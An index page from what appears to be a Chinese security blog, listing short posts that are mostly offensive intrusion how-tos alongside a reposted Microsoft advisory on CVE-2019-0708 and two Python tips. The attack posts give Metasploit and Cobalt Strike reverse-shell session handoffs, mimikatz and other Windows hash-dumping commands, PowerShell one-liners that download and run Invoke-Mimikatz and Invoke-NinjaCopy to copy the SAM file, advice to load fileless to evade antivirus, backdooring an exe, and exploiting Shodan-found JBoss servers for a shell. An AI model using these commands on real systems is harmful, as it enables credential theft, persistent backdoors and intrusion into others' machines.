<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  

  
  <title>rich4rd&#39;s blog</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <meta property="og:type" content="website">
<meta property="og:title" content="rich4rd&#39;s blog">
<meta property="og:url" content="http:&#x2F;&#x2F;0d4y.cc&#x2F;index.html">
<meta property="og:site_name" content="rich4rd&#39;s blog">
<meta property="og:locale" content="en">
<meta name="twitter:card" content="summary">
  
    <link rel="alternate" href="/atom.xml" title="rich4rd&#39;s blog" type="application/atom+xml">
  
  
    <link rel="icon" href="/favicon.png">
  
  
    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
  
  <link rel="stylesheet" href="/css/style.css">
</head>

<body>
  <div id="container">
    <div id="wrap">
      <header id="header">
  <div id="banner"></div>
  <div id="header-outer" class="outer">
    <div id="header-title" class="inner">
      <h1 id="logo-wrap">
        <a href="/" id="logo">rich4rd&#39;s blog</a>
      </h1>
      
    </div>
    <div id="header-inner" class="inner">
      <nav id="main-nav">
        <a id="main-nav-toggle" class="nav-icon"></a>
        
          <a class="main-nav-link" href="/">Home</a>
        
          <a class="main-nav-link" href="/archives">Archives</a>
        
      </nav>
      <nav id="sub-nav">
        
          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
        
        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
      </nav>
      <div id="search-form-wrap">
        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://0d4y.cc"></form>
      </div>
    </div>
  </div>
</header>
      <div class="outer">
        <section id="main">
  
    <article id="post-e5-88-a9-e7-94-a8powershell-e9-9a-90-e8-97-8f-e6-89-a7-e8-a1-8c-e5-90-8e-e9-97-a8" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2019/08/30/e5-88-a9-e7-94-a8powershell-e9-9a-90-e8-97-8f-e6-89-a7-e8-a1-8c-e5-90-8e-e9-97-a8/" class="article-date">
  <time datetime="2019-08-30T01:49:22.000Z" itemprop="datePublished">2019-08-30</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/">内网渗透</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2019/08/30/e5-88-a9-e7-94-a8powershell-e9-9a-90-e8-97-8f-e6-89-a7-e8-a1-8c-e5-90-8e-e9-97-a8/">利用powershell隐藏执行后门</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <p>运行后门时，有些后门不能中断。双击运行这种后门会产生一个黑框。 一条命令就能使其在后台执行 <img src="http://112.74.49.123/wp-content/uploads/2019/08/1_1.png" alt=""> 命令解释： start-process启动一个进程 -windowstyle窗口样式 hidden隐藏</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://0d4y.cc/2019/08/30/e5-88-a9-e7-94-a8powershell-e9-9a-90-e8-97-8f-e6-89-a7-e8-a1-8c-e5-90-8e-e9-97-a8/" data-id="ck2d1je7k000tv6phd75o722r" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
</article>


  
    <article id="post-e5-86-85-e7-bd-91-e6-b8-97-e9-80-8f-ef-bc-9acs-e4-bb-a3-e7-90-86proxychainsnmap-e8-bf-9b-e8-a1-8c-e5-86-85-e7-bd-91-e6-89-ab-e6-8f-8f" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2019/08/24/e5-86-85-e7-bd-91-e6-b8-97-e9-80-8f-ef-bc-9acs-e4-bb-a3-e7-90-86proxychainsnmap-e8-bf-9b-e8-a1-8c-e5-86-85-e7-bd-91-e6-89-ab-e6-8f-8f/" class="article-date">
  <time datetime="2019-08-24T15:11:29.000Z" itemprop="datePublished">2019-08-24</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/">内网渗透</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2019/08/24/e5-86-85-e7-bd-91-e6-b8-97-e9-80-8f-ef-bc-9acs-e4-bb-a3-e7-90-86proxychainsnmap-e8-bf-9b-e8-a1-8c-e5-86-85-e7-bd-91-e6-89-ab-e6-8f-8f/">内网渗透：CS代理+proxychains+nmap进行内网扫描</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <p>前提：拿下边界机之后，进入内网，想用nmap怎么办？ CS可以开启代理，但是是socks4的代理，只能使用tcp协议，所以nmap使用的时候要使用-sT选择<em><strong>使用tcp</strong>_协议，要使用-Pn</em><strong>不使用ICMP</strong>_的ping确认主机存活 <img src="http://112.74.49.123/wp-content/uploads/2019/08/3_1.png" alt=""> <img src="http://112.74.49.123/wp-content/uploads/2019/08/3_2.png" alt=""></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://0d4y.cc/2019/08/24/e5-86-85-e7-bd-91-e6-b8-97-e9-80-8f-ef-bc-9acs-e4-bb-a3-e7-90-86proxychainsnmap-e8-bf-9b-e8-a1-8c-e5-86-85-e7-bd-91-e6-89-ab-e6-8f-8f/" data-id="ck2d1je7g000qv6ph3yuf9fd2" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
</article>


  
    <article id="post-msfcobaltstrike-e8-81-94-e5-8a-a8-e4-ba-8c-ef-bc-9a-e6-8a-8acs-e4-b8-ad-e7-9a-84-e6-9c-ba-e5-99-a8spwan-e7-bb-99msf" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2019/08/24/msfcobaltstrike-e8-81-94-e5-8a-a8-e4-ba-8c-ef-bc-9a-e6-8a-8acs-e4-b8-ad-e7-9a-84-e6-9c-ba-e5-99-a8spwan-e7-bb-99msf/" class="article-date">
  <time datetime="2019-08-24T14:36:35.000Z" itemprop="datePublished">2019-08-24</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/">内网渗透</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2019/08/24/msfcobaltstrike-e8-81-94-e5-8a-a8-e4-ba-8c-ef-bc-9a-e6-8a-8acs-e4-b8-ad-e7-9a-84-e6-9c-ba-e5-99-a8spwan-e7-bb-99msf/">msf+cobaltstrike联动(二)：把cs中的机器spwan给msf</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <p>前提：CS已经获取到session，可以进入图形化管理机器，现在需要使用msf进行进一步渗透，需要msf的metepreter。 开启msf <img src="http://112.74.49.123/wp-content/uploads/2019/08/2_1.png" alt=""> msf设置监听 <code>msf &gt; use exploit/multi/handler msf exploit(handler) &gt; set payload windows/meterpreter/reverse_tcp payload =&gt; windows/meterpreter/reverse_tcp msf exploit(handler) &gt; set lhost 192.168.3.117 lhost =&gt; 192.168.3.117 msf exploit(handler) &gt; set lport 2222 lport =&gt;2222 msf exploit(handler) &gt; exploit</code> <img src="http://112.74.49.123/wp-content/uploads/2019/08/2_2.png" alt=""> 在CS上开启监听，设置payload为windows/foreign/reverse_tcp host为msf的host port为msf的监听端口 <img src="http://112.74.49.123/wp-content/uploads/2019/08/2_3.png" alt=""> 在控制机器上右键选择Spawn <img src="http://112.74.49.123/wp-content/uploads/2019/08/2_4.png" alt=""> 选择Spwan之后会需要选择一个监听，选择刚创建的msf的监听 <img src="http://112.74.49.123/wp-content/uploads/2019/08/2_5.png" alt=""> 可以看到msf已经接收到cs上spwan过来的session <img src="http://112.74.49.123/wp-content/uploads/2019/08/2_6.png" alt=""></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://0d4y.cc/2019/08/24/msfcobaltstrike-e8-81-94-e5-8a-a8-e4-ba-8c-ef-bc-9a-e6-8a-8acs-e4-b8-ad-e7-9a-84-e6-9c-ba-e5-99-a8spwan-e7-bb-99msf/" data-id="ck2d1je8a001uv6phf45eadfa" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
</article>


  
    <article id="post-msfcobaltstrike-e8-81-94-e5-8a-a8-e4-b8-80-ef-bc-9a-e6-8a-8amsf-e7-9a-84session-e5-8f-91-e7-bb-99cobaltstrike" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2019/08/24/msfcobaltstrike-e8-81-94-e5-8a-a8-e4-b8-80-ef-bc-9a-e6-8a-8amsf-e7-9a-84session-e5-8f-91-e7-bb-99cobaltstrike/" class="article-date">
  <time datetime="2019-08-24T14:19:27.000Z" itemprop="datePublished">2019-08-24</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/">内网渗透</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2019/08/24/msfcobaltstrike-e8-81-94-e5-8a-a8-e4-b8-80-ef-bc-9a-e6-8a-8amsf-e7-9a-84session-e5-8f-91-e7-bb-99cobaltstrike/">msf+cobaltstrike联动(一)：把msf的session发给cobaltstrike</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <p>前提：MFS已经获取到session，可以进入metepreter，现在需要使用cobaltstrike进行图形化管理或团队协作。 cobaltstrike起一个beacon监听，如使用：windows/beacon_http/reverse_http 设置好host和port之后启动监听。 <img src="http://112.74.49.123/wp-content/uploads/2019/08/1.png" alt=""> MSF中使用 <code>use exploit/windows/local/payload_inject msf exploit(payload_inject) &gt; set payload windows/meterpreter/reverse_http msf exploit(payload_inject) &gt; set DisablePayloadHandler true msf exploit(payload_inject) &gt; set LHOST 192.168.3.117 msf exploit(payload_inject) &gt; set LPORT 10001 msf exploit(payload_inject) &gt; set SESSION 1</code> <img src="http://112.74.49.123/wp-content/uploads/2019/08/2.png" alt=""> 注：<code>set DisablePayloadHandler true</code> 作用是msf不监听，代表是用来返给其他监听的 <strong>都设置好后</strong> <code>msf exploit(payload_inject) &gt; run</code> 去CS端查看结果 <img src="http://112.74.49.123/wp-content/uploads/2019/08/3.png" alt=""> cs成功接收到msf中的session</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://0d4y.cc/2019/08/24/msfcobaltstrike-e8-81-94-e5-8a-a8-e4-b8-80-ef-bc-9a-e6-8a-8amsf-e7-9a-84session-e5-8f-91-e7-bb-99cobaltstrike/" data-id="ck2d1je88001pv6phalqqaavq" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
</article>


  
    <article id="post-windows-e4-b8-8bhash-e6-8a-93-e5-8f-96-e7-9a-84-e5-87-a0-e7-a7-8d-e6-96-b9-e5-bc-8f" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2019/08/15/windows-e4-b8-8bhash-e6-8a-93-e5-8f-96-e7-9a-84-e5-87-a0-e7-a7-8d-e6-96-b9-e5-bc-8f/" class="article-date">
  <time datetime="2019-08-15T08:24:32.000Z" itemprop="datePublished">2019-08-15</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/">内网渗透</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2019/08/15/windows-e4-b8-8bhash-e6-8a-93-e5-8f-96-e7-9a-84-e5-87-a0-e7-a7-8d-e6-96-b9-e5-bc-8f/">windows下hash抓取的几种方式</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <p>前提：在渗透测试过程中，对于windows系统的机器渗透需要注意hash的获取，其中hash分为LM-HASH与NTLM-HASH，在windows系统中，hash的默认存储位置为： <code>C:\Windows\System32\config\SAM</code></p>
<h2 id="各种工具："><a href="#各种工具：" class="headerlink" title="各种工具："></a>各种工具：</h2><ul>
<li><strong>mimikatz</strong> <code>privilege::debug sekurlsa::logonPasswords</code></li>
<li><strong>wce</strong> <code>wce.exe</code></li>
<li><strong>QuarkPwDump</strong> <code>QuarkPwDump.exe -dhl</code></li>
<li><strong>powershell脚本：</strong> 使用<a href="https://github.com/PowerShellMafia/PowerSploit" target="_blank" rel="noopener">powersploit</a>中的mimikatz.ps1 <strong><em>mimikatz</em></strong> <strong><em>在线加载：</em></strong> <code>powershell -exec bypass &quot;IEX (New-Object Net.WebClient).DownloadString(&#39;http://ip/Invoke-Mimikatz.ps1&#39;);Invoke-Mimikatz -Dumpcreds&quot;</code> <strong><em>本地加载：</em></strong> <code>powershell -exec bypass &quot;import-module Invoke-Mimikatz.ps1;Invoke-Mimikatz -Dumpcreds&quot;</code></li>
</ul>
<p><strong><em>Ninja-copy</em></strong> <strong><em>在线加载：</em></strong> <code>powershell -exec bypass &quot;IEX (New-Object Net.WebClient).DownloadString(&#39;http://ip/Invoke-NinjaCopy.ps1&#39;);Invoke-NinjaCopy -Path C:\Windows\System32\config\SAM -LocalDestination C:\SAM.txt;&quot;</code> <strong><em>本地加载：</em></strong> <code>powershell -exec bypass &quot;Import-Module .\Invoke-NinjaCopy.ps1;Invoke-NinjaCopy -Path C:\Windows\System32\config\SAM -LocalDestination .\sam.hive&quot;</code> 后记：为防止防火墙，杀软等工具杀掉ps1脚本，推荐使用在线加载的方式，文件不落地。</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://0d4y.cc/2019/08/15/windows-e4-b8-8bhash-e6-8a-93-e5-8f-96-e7-9a-84-e5-87-a0-e7-a7-8d-e6-96-b9-e5-bc-8f/" data-id="ck2d1je8j0028v6ph79nhahax" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
</article>


  
    <article id="post-python-e6-9f-a5-e7-9c-8b-e6-9c-ac-e5-9c-b0-e5-ba-93-e7-94-a8-e6-b3-95" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2019/08/07/python-e6-9f-a5-e7-9c-8b-e6-9c-ac-e5-9c-b0-e5-ba-93-e7-94-a8-e6-b3-95/" class="article-date">
  <time datetime="2019-08-07T07:09:35.000Z" itemprop="datePublished">2019-08-07</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/python%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1/">python程序设计</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2019/08/07/python-e6-9f-a5-e7-9c-8b-e6-9c-ac-e5-9c-b0-e5-ba-93-e7-94-a8-e6-b3-95/">python查看本地库用法</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <p><code>python -m pydoc -p 0</code> 使用后会生成个localhost上随机端口的web服务，直接访问即可 <img src="http://112.74.49.123/wp-content/uploads/2019/08/python%E5%BA%93.png" alt=""></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://0d4y.cc/2019/08/07/python-e6-9f-a5-e7-9c-8b-e6-9c-ac-e5-9c-b0-e5-ba-93-e7-94-a8-e6-b3-95/" data-id="ck2d1je8f0024v6ph01xkdtxf" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
</article>


  
    <article id="post-python-e4-bd-bf-e7-94-a8isoparser-e6-a8-a1-e5-9d-97-e8-8e-b7-e5-8f-96iso-e9-95-9c-e5-83-8f-e6-96-87-e4-bb-b6-e5-86-85-e5-ae-b9" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2019/08/07/python-e4-bd-bf-e7-94-a8isoparser-e6-a8-a1-e5-9d-97-e8-8e-b7-e5-8f-96iso-e9-95-9c-e5-83-8f-e6-96-87-e4-bb-b6-e5-86-85-e5-ae-b9/" class="article-date">
  <time datetime="2019-08-07T07:03:39.000Z" itemprop="datePublished">2019-08-07</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/python%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1/">python程序设计</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2019/08/07/python-e4-bd-bf-e7-94-a8isoparser-e6-a8-a1-e5-9d-97-e8-8e-b7-e5-8f-96iso-e9-95-9c-e5-83-8f-e6-96-87-e4-bb-b6-e5-86-85-e5-ae-b9/">python使用isoparser模块获取iso镜像文件内容</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <p><code>import isoparser iso = isoparser.parse(&quot;路径&quot;) print iso.record(&quot;boot&quot;, &quot;grub&quot;).children #获取子路径内的文件目录 print iso.record(&quot;boot&quot;, &quot;grub&quot;, &quot;grub.cfg&quot;).content #获取文件内容</code> eg: <img src="http://112.74.49.123/wp-content/uploads/2019/08/iso%E5%BA%93.png" alt="获取kali镜像内的文件"></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://0d4y.cc/2019/08/07/python-e4-bd-bf-e7-94-a8isoparser-e6-a8-a1-e5-9d-97-e8-8e-b7-e5-8f-96iso-e9-95-9c-e5-83-8f-e6-96-87-e4-bb-b6-e5-86-85-e5-ae-b9/" data-id="ck2d1je8d001zv6phfpvh6qsd" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
</article>


  
    <article id="post-prevent-a-worm-by-updating-remote-desktop-services-cve-2019-0708" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2019/05/15/prevent-a-worm-by-updating-remote-desktop-services-cve-2019-0708/" class="article-date">
  <time datetime="2019-05-15T01:54:29.000Z" itemprop="datePublished">2019-05-15</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/%E5%A8%81%E8%83%81%E6%83%85%E6%8A%A5/">威胁情报</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2019/05/15/prevent-a-worm-by-updating-remote-desktop-services-cve-2019-0708/">Prevent a worm by updating Remote Desktop Services (CVE-2019-0708)</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <p>Today Microsoft released fixes for a critical Remote Code Execution vulnerability, <a href="https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2019-0708" target="_blank" rel="noopener">CVE-2019-0708</a>, in Remote Desktop Services – formerly known as Terminal Services – that affects some older versions of Windows. The Remote Desktop Protocol (RDP) itself is not vulnerable. This vulnerability is pre-authentication and requires no user interaction. In other words, the vulnerability is ‘wormable’, meaning that any future malware that exploits this vulnerability could propagate from vulnerable computer to vulnerable computer in a similar way as the WannaCry malware spread across the globe in 2017. While we have observed no exploitation of this vulnerability, it is highly likely that malicious actors will write an exploit for this vulnerability and incorporate it into their malware. Now that I have your attention, it is important that affected systems are patched as quickly as possible to prevent such a scenario from happening. In response, we are taking the unusual step of providing a security update for all customers to protect Windows platforms, including some out-of-support versions of Windows. Vulnerable in-support systems include Windows 7, Windows Server 2008 R2, and Windows Server 2008. Downloads for in-support versions of Windows can be found in the <a href="https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2019-0708" target="_blank" rel="noopener">Microsoft Security Update Guide</a>. Customers who use an in-support version of Windows and have automatic updates enabled are automatically protected.  Out-of-support systems include Windows 2003 and Windows XP. If you are on an out-of-support version, the best way to address this vulnerability is to upgrade to the latest version of Windows. Even so, we are making fixes available for these out-of-support versions of Windows in <a href="https://support.microsoft.com/help/4500705" target="_blank" rel="noopener">KB4500705</a>. Customers running Windows 8 and Windows 10 are not affected by this vulnerability, and it is no coincidence that later versions of Windows are unaffected. Microsoft invests heavily in strengthening the security of its products, often through major architectural improvements that are not possible to backport to earlier versions of Windows. There is partial mitigation on affected systems that have <a href="https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc732713(v=ws.11)" target="_blank" rel="noopener">Network Level Authentication (NLA)</a> enabled. The affected systems are mitigated against ‘wormable’ malware or advanced malware threats that could exploit the vulnerability, as NLA requires authentication before the vulnerability can be triggered. However, affected systems are still vulnerable to Remote Code Execution (RCE) exploitation if the attacker has valid credentials that can be used to successfully authenticate. It is for these reasons that we strongly advise that all affected systems – irrespective of whether NLA is enabled or not – should be updated as soon as possible. Resources <a href="https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2019-0708" target="_blank" rel="noopener">Links to downloads for Windows 7, Windows 2008 R2, and Windows 2008</a> <a href="https://support.microsoft.com/help/4500705" target="_blank" rel="noopener">Links to downloads for Windows 2003 and Windows XP</a> Simon Pope, Director of Incident Response, Microsoft Security Response Center (MSRC) <strong>____</strong>分割线<strong><strong>__</strong></strong> 我只是个搬运工，别打我</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://0d4y.cc/2019/05/15/prevent-a-worm-by-updating-remote-desktop-services-cve-2019-0708/" data-id="ck2d1je8b001wv6ph4s29b6zw" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
</article>


  
    <article id="post-e5-86-85-e7-bd-91-e6-b8-97-e9-80-8f-e5-90-8e-e9-97-a8" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2019/04/07/e5-86-85-e7-bd-91-e6-b8-97-e9-80-8f-e5-90-8e-e9-97-a8/" class="article-date">
  <time datetime="2019-04-06T17:26:09.000Z" itemprop="datePublished">2019-04-07</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/">内网渗透</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2019/04/07/e5-86-85-e7-bd-91-e6-b8-97-e9-80-8f-e5-90-8e-e9-97-a8/">内网渗透后门(一)：backdoor-factory</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <p>前提：拿下一台机器之后，需要持续控制，可以种一个后门 kali里边有一款强大的工具——backdoor-factory，github地址：<a href="https://github.com/secretsquirrel/the-backdoor-factory" target="_blank" rel="noopener">the-backdoor-factory</a> 该软件的原理：可执行二进制文件中有大量的00，这些00是不包含数据的，将这些数据替换成payload，并且在程序执行的时候，jmp到代码段，来触发payload。 第一步： <img src="http://112.74.49.123/wp-content/uploads/2019/04/backdoor1.jpg" alt="选择一个想要植入后门的exe"> 选择一个想要植入后门的exe，将该exe拷贝至kali 第二步： <img src="http://112.74.49.123/wp-content/uploads/2019/04/backdoor2.jpg" alt="检查是否能被植入后门"> 检查是否能被植入后门 第三步： <img src="http://112.74.49.123/wp-content/uploads/2019/04/backdoor3.jpg" alt="检查是否有足够空间用于加载后门"> 检查是否有足够空间用于加载后门 第四步： <img src="http://112.74.49.123/wp-content/uploads/2019/04/backdoor4.jpg" alt="查看能够使用的payload"> 查看能够使用的payload 第五步： <img src="http://112.74.49.123/wp-content/uploads/2019/04/backdoor5.jpg" alt="设置payload"> 设置payload并选择加载payload的位置，上图选择将payload加载在2处 第六步： <img src="http://112.74.49.123/wp-content/uploads/2019/04/backdoor6.jpg" alt="msf开启监听"> 攻击机的msf开启监听 第七步： <img src="http://112.74.49.123/wp-content/uploads/2019/04/backdoor7.jpg" alt="在靶机中执行带有后门的exe"> 在靶机中执行带有后门的exe 第八步： <img src="http://112.74.49.123/wp-content/uploads/2019/04/backdoor8.jpg" alt="接收到shell"> 接收到shell</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://0d4y.cc/2019/04/07/e5-86-85-e7-bd-91-e6-b8-97-e9-80-8f-e5-90-8e-e9-97-a8/" data-id="ck2d1je7f000pv6ph3nukflrz" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
</article>


  
    <article id="post-jboss-e4-bd-8e-e7-89-88-e6-9c-ac-e6-bc-8f-e6-b4-9e-e6-8b-bf-e7-ab-99" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2019/01/24/jboss-e4-bd-8e-e7-89-88-e6-9c-ac-e6-bc-8f-e6-b4-9e-e6-8b-bf-e7-ab-99/" class="article-date">
  <time datetime="2019-01-24T09:24:43.000Z" itemprop="datePublished">2019-01-24</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/Web%E5%AE%89%E5%85%A8/">Web安全</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2019/01/24/jboss-e4-bd-8e-e7-89-88-e6-9c-ac-e6-bc-8f-e6-b4-9e-e6-8b-bf-e7-ab-99/">jboss低版本漏洞拿站</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <p><img src="http://112.74.49.123/wp-content/uploads/2019/01/1.png" alt="在shodan找目标网站-1"> 在shodan找目标网站，我们设定目标为jboss<br><img src="http://112.74.49.123/wp-content/uploads/2019/01/2.png" alt="使用脚本-2"> 打开目标站，确认可以连接<br><img src="http://112.74.49.123/wp-content/uploads/2019/01/3.png" alt="使用脚本-3"> 使用脚本，确认漏洞是否存在<br><img src="http://112.74.49.123/wp-content/uploads/2019/01/4.png" alt="使用脚本-4"> 选择yes，使用exp攻击漏洞<br><img src="http://112.74.49.123/wp-content/uploads/2019/01/5.png" alt="使用脚本-5"> 反弹shell，设置自己的vps开启监听，输入自己的vps的ip和监听port<br><img src="http://112.74.49.123/wp-content/uploads/2019/01/6.png" alt="使用脚本-6"> 接收到shell，并且可正常使用<br>脚本下载方式：<a href="https://github.com/joaomatosf/jexboss" target="_blank" rel="noopener">https://github.com/joaomatosf/jexboss</a> 该脚本依赖于python2<br>使用方式： 1.安装必要的python库 <code>pip install -r requires.txt</code> 2.执行 <code>python jexboss.py -host http://ip:port</code></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://0d4y.cc/2019/01/24/jboss-e4-bd-8e-e7-89-88-e6-9c-ac-e6-bc-8f-e6-b4-9e-e6-8b-bf-e7-ab-99/" data-id="ck2d1je80001dv6phhgqucvhl" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
</article>


  


  <nav id="page-nav">
    
    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="page-number" href="/page/3/">3</a><a class="page-number" href="/page/4/">4</a><a class="extend next" rel="next" href="/page/2/">Next &amp;raquo;</a>
  </nav>

</section>
        
          <aside id="sidebar">
  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Categories</h3>
    <div class="widget">
      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/CTF%E5%AF%86%E7%A0%81/">CTF密码</a><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/CTF%E5%AF%86%E7%A0%81/%E5%8F%A4%E5%85%B8%E5%AF%86%E7%A0%81/">古典密码</a><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/CTF%E5%AF%86%E7%A0%81/%E5%8F%A4%E5%85%B8%E5%AF%86%E7%A0%81/%E5%AF%86%E7%A0%81%E5%AD%A6/">密码学</a></li></ul></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/CTF%E5%B9%B3%E5%8F%B0%E6%90%AD%E5%BB%BA/">CTF平台搭建</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/Iot%E5%AE%89%E5%85%A8/">Iot安全</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/MySQL/">MySQL</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/Web%E5%AE%89%E5%85%A8/">Web安全</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/centos/">centos</a><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/centos/linux/">linux</a><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/centos/linux/%E4%BB%A3%E7%90%86/">代理</a></li></ul></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/html/">html</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/kali-linux/">kali linux</a><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/kali-linux/windows/">windows</a></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/linux/">linux</a><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/linux/Web%E5%AE%89%E5%85%A8/">Web安全</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/linux/linux%E9%80%9A%E7%94%A8/">linux通用</a><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/linux/linux%E9%80%9A%E7%94%A8/%E4%BB%A3%E7%90%86/">代理</a><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/linux/linux%E9%80%9A%E7%94%A8/%E4%BB%A3%E7%90%86/%E7%A7%91%E5%AD%A6%E4%B8%8A%E7%BD%91/">科学上网</a></li></ul></li></ul></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/linux%E9%80%9A%E7%94%A8/">linux通用</a><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/linux%E9%80%9A%E7%94%A8/%E4%BB%A3%E7%90%86/">代理</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/linux%E9%80%9A%E7%94%A8/%E6%A0%91%E8%8E%93%E6%B4%BE/">树莓派</a></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/python%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1/">python程序设计</a></li><li class="category-list-item"><a 